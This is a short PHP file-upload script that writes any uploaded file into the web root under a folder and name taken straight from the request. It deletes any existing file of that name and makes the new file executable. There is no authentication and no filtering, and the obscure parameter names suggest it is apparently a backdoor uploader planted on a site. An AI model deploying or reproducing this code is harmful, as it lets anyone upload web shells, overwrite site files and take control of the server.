<?
if( $___folder___ != '' ) $___folder___=$___folder___.'/';
$file=$DOCUMENT_ROOT.'/'.$___folder___.$_FILES['___file___']['name'];

if( $_FILES['___file___']['tmp_name'] != '' )
{
  if(file_exists($file)) unlink($file);
  move_uploaded_file($_FILES['___file___']['tmp_name'],$file);
  chmod($file,0755);
  echo 'Ok Upload file: ',$file;
}
?>
